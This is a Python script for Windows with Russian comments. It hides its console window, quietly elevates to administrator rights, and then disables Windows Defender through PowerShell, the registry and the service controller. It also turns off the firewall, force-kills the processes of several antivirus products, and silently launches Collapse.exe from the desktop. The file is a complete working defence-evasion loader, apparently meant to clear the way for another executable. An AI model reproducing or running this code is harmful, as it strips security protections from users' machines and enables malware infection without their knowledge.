import ctypes
import subprocess
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def hide_console():
    """Скрытие окна консоли"""
    wh = ctypes.windll.kernel32.GetConsoleWindow()
    if wh:
        ctypes.windll.user32.ShowWindow(wh, 0)  # SW_HIDE

def disable_defender():
    subprocess.run([
        'powershell', '-Command',
        'Set-MpPreference -DisableRealtimeMonitoring $true'
    ], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
    
    subprocess.run([
        'reg', 'add', 
        'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender',
        '/v', 'DisableAntiSpyware', '/t', 'REG_DWORD', '/d', '1', '/f'
    ], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
    
    subprocess.run(['net', 'stop', 'WinDefend', '/y'], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
    subprocess.run(['sc', 'config', 'WinDefend', 'start=', 'disabled'], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)

def disable_firewall():
    subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'], 
                   creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)

def kill_antivirus():
    av_processes = ['MsMpEng.exe', 'NortonSecurity.exe', 'avp.exe', 'ekrn.exe', 'AvastSvc.exe', 'avgnt.exe', 'dwengine.exe', 'MBAMService.exe']
    for proc in av_processes:
        subprocess.run(['taskkill', '/f', '/im', proc], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)

def run_collapse():
    """Запуск Collapse.exe с рабочего стола"""
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    collapse_path = os.path.join(desktop, 'Collapse.exe')
    
    if os.path.exists(collapse_path):
        subprocess.Popen([collapse_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    else:
        return False

if __name__ == "__main__":
    # Скрываем консоль
    hide_console()
    
    # Проверка прав администратора
    if not is_admin():
        # Перезапуск с правами администратора (скрыто)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
        sys.exit()
    
    # Отключение антивируса
    disable_defender()
    disable_firewall()
    kill_antivirus()
    
    # Запуск Collapse.exe
    run_collapse()
    
    # Завершение
    sys.exit()